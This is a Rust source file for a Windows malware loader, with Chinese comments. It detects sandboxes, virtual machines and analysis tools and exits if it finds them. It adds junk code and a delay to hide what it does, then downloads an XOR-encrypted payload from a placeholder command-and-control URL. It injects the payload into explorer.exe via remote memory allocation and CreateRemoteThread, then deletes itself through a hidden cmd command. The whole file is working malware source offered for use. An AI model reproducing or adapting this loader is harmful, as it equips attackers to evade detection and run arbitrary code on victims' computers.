#![windows_subsystem = "windows"]
use std::{ptr::null_mut, thread, time::Duration, fs::File, io::Read};
use windows::core::PWSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::ToolHelp::*;
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS, CreateRemoteThread, CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, CREATE_NO_WINDOW};
use windows::Win32::System::Memory::*;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use sysinfo::{System, SystemExt, ProcessExt};
use windows::Win32::System::SystemInformation::GetTickCount64;
use windows::Win32::UI::Input::KeyboardAndMouse::{GetLastInputInfo, LASTINPUTINFO};

// ============================================================================
// 多态代码区域 - 用于混淆和反检测
// 这些函数看起来是正常的业务逻辑，实际用于混淆真实意图
// ============================================================================
fn fake_func_1() { 
    // 模拟数学计算
    let _ = 2024 * 3; 
}
fn fake_func_2() { 
    // 模拟字符串处理
    let s = "data".to_string(); 
    let _ = s.find('a'); 
}
fn fake_func_3() { 
    // 模拟数组操作
    let v: Vec<u8> = (10..20).collect(); 
    let _ = v.len(); 
}
fn fake_func_4() { 
    // 模拟时间获取
    let _ = std::time::SystemTime::now(); 
}

// ============================================================================
// 自清理功能 - 执行完成后删除自身文件
// ============================================================================
fn delete_self() {
    let exe = env::current_exe().unwrap();
    // 构造删除命令：延迟3秒后删除当前可执行文件
    let cmd = format!("cmd /C ping -n 3 127.0.0.1 >nul & del /f /q \"{}\"", exe.display());
    let mut cmd_w: Vec<u16> = OsStr::new(&cmd).encode_wide().chain(Some(0)).collect();
    let mut si = STARTUPINFOW::default();
    let mut pi = PROCESS_INFORMATION::default();
    unsafe {
        CreateProcessW(
            None,
            PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_NO_WINDOW,
            None,
            None,
            &mut si,
            &mut pi,
        );
    }
}

// ============================================================================
// 沙箱检测功能 - 检测系统运行时间
// 沙箱环境通常运行时间较短，真实环境运行时间较长
// ============================================================================
fn is_short_uptime() -> bool {
    unsafe { GetTickCount64() < 5 * 60 * 1000 } // 检测系统运行时间是否少于5分钟
}

// ============================================================================
// 用户交互检测 - 检测用户是否有输入活动
// 沙箱环境通常没有真实的用户交互
// ============================================================================
fn is_no_user_input() -> bool {
    unsafe {
        let mut lii = LASTINPUTINFO { cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32, dwTime: 0 };
        if GetLastInputInfo(&mut lii).as_bool() {
            let idle = GetTickCount64() - lii.dwTime as u64;
            idle > 2 * 60 * 1000 // 检测用户空闲时间是否超过2分钟
        } else {
            false
        }
    }
}

// ============================================================================
// 环境检测 - 检测用户名和计算机名中的沙箱特征
// 沙箱环境通常使用特定的用户名和计算机名
// ============================================================================
fn is_sandbox_user() -> bool {
    let user = env::var("USERNAME").unwrap_or_default().to_lowercase();
    let computer = env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
    // 检测用户名或计算机名是否包含沙箱相关关键词
    user.contains("sandbox") || computer.contains("sandbox") || user.contains("test") || computer.contains("test")
}

// ============================================================================
// 沙箱进程检测 - 检测常见的沙箱和分析工具进程
// ============================================================================
fn is_sandbox_process_running() -> bool {
    let sandbox_procs = [
        "vmsrvc.exe", "vmusrvc.exe", "vboxservice.exe", "vboxtray.exe",  // VirtualBox相关
        "wireshark.exe", "procmon.exe", "sandboxiedcomlaunch.exe", "sandboxierpcss.exe"  // 分析工具
    ];
    let sys = System::new_all();
    for process in sys.processes_by_name("") {
        let name = process.name().to_lowercase();
        if sandbox_procs.iter().any(|&p| name.contains(p)) {
            return true;
        }
    }
    false
}

// ============================================================================
// 主程序入口
// ============================================================================
fn main() {
    // ========================================================================
    // 第一阶段：环境检测和沙箱对抗
    // ========================================================================
    // 如果检测到沙箱环境，直接退出程序
    if is_short_uptime() || is_no_user_input() || is_sandbox_user() || is_sandbox_process_running() {
        std::process::exit(0);
    }

    // ========================================================================
    // 第二阶段：行为伪装和延迟执行
    // ========================================================================
    // 延迟30秒执行，模拟正常程序的启动时间
    thread::sleep(Duration::from_secs(30));

    // 访问系统文件，模拟正常的系统操作
    let _ = File::open("C:\\Windows\\System32\\drivers\\etc\\hosts");

    // 执行假解密操作，混淆真实意图
    let _fake = base64::decode("SGVsbG8gd29ybGQ=").unwrap_or_default();

    // 调用多态垃圾代码，增加代码复杂度
    fake_func_1();
    fake_func_2();
    fake_func_3();
    fake_func_4();

    // ========================================================================
    // 第三阶段：数据获取和解密
    // ========================================================================
    // 从远程服务器下载加密的payload数据
    let url = "http://your-server.com:port/output.bin"; // 需要替换为实际的C2服务器地址
    let resp = reqwest::blocking::get(url).expect("下载数据失败");
    let ciphertext = resp.bytes().expect("读取数据内容失败");

    // 使用XOR密钥解密数据
    let key: [u8; 8] = [0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x7A, 0x8B];
    let shellcode: Vec<u8> = ciphertext.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect();
    println!("数据处理完成，长度: {} 字节", shellcode.len());

    // ========================================================================
    // 第四阶段：进程注入和执行
    // ========================================================================
    unsafe {
        // 步骤1：枚举系统进程，查找目标进程explorer.exe
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        let mut entry = PROCESSENTRY32::default();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        let mut found = false;
        let mut pid = 0;
        
        if Process32First(snapshot, &mut entry).as_bool() {
            loop {
                let name = String::from_utf8_lossy(
                    &entry.szExeFile.iter().map(|&c| c as u8).take_while(|&c| c != 0).collect::<Vec<u8>>()
                ).to_lowercase();
                if name == "explorer.exe" {
                    pid = entry.th32ProcessID;
                    found = true;
                    break;
                }
                if !Process32Next(snapshot, &mut entry).as_bool() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        
        if !found {
            println!("未找到目标进程");
            return;
        }
        println!("目标进程 explorer.exe PID: {}", pid);

        // 步骤2：打开目标进程，获取进程句柄
        // PROCESS_ALL_ACCESS (0x1F0FFF) 提供完整的进程访问权限
        let h_proc = OpenProcess(PROCESS_ACCESS_RIGHTS(0x1F0FFF), false, pid).unwrap();
        if h_proc.is_invalid() {
            println!("无法打开目标进程");
            return;
        }

        // 步骤3：在目标进程中分配内存空间
        let addr = VirtualAllocEx(
            h_proc,
            Some(null_mut()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,  // 提交并保留内存
            PAGE_EXECUTE_READWRITE,    // 可执行、可读、可写权限
        );
        if addr.is_null() {
            println!("远程分配内存失败");
            CloseHandle(h_proc);
            return;
        }

        // 步骤4：将shellcode写入目标进程的内存空间
        let mut written = 0;
        let ok = WriteProcessMemory(
            h_proc,
            addr,
            shellcode.as_ptr() as _,
            shellcode.len(),
            Some(&mut written),
        ).as_bool();
        if !ok || written != shellcode.len() {
            println!("写入数据失败");
            CloseHandle(h_proc);
            return;
        }

        // 步骤5：在目标进程中创建远程线程执行shellcode
        let h_thread = CreateRemoteThread(
            h_proc,
            None,                           // 默认安全属性
            0,                              // 默认栈大小
            Some(std::mem::transmute(addr)), // 线程起始地址（shellcode地址）
            None,                           // 无参数传递
            0,                              // 立即运行
            None,                           // 不需要线程ID
        ).ok();
        
        if let Some(h_thread) = h_thread {
            println!("[+] 任务已下发: explorer.exe ({})", pid);
            CloseHandle(h_thread);
            // 执行完成后删除自身文件
            delete_self();
        } else {
            println!("远程线程创建失败");
        }
        CloseHandle(h_proc);
    }
}
